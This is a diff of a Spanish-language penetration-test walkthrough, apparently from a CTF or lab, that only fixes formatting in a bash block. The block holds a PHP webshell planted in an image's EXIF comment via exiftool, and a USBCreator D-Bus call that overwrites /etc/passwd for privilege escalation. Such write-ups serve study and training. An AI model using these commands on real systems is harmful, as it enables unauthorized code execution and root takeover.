@@ -37,11 +37,12 @@ La webshell ejecuta como `www-data`. En `cdata/users` cada usuario es un archivo
 
 ```bash
 # webshell en avatar
- exiftool -Comment='<?php system($_GET["cmd"]); ?>' avatar.png
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' avatar.png
 # USBCreator
 gdbus call --system --dest com.ubuntu.USBCreator \
   --object-path /com/ubuntu/USBCreator \
-  --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true```
+  --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
+```
 
 ## Movimiento lateral
 
